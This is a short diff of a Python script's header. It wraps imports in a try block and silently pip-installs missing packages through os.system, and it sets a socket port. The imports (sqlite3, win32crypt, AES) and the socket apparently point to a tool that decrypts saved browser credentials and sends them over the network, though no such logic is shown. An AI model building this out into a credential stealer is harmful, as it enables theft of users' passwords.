@@ -1,13 +1,16 @@
 import os
 import socket
 import json
-import base64
-import sqlite3
-import win32crypt
-from Crypto.Cipher import AES
-import shutil
-from datetime import timezone, datetime, timedelta
-from colorama import Fore
+try:
+  import base64
+  import sqlite3
+  import win32crypt
+  from Crypto.Cipher import AES
+  import shutil
+  from datetime import timezone, datetime, timedelta
+  from colorama import Fore
+except ImportError:
+  os.system("pip install pycryptodome pypiwin32 colorama")
 
 HEADER = 1024
 PORT = 9616
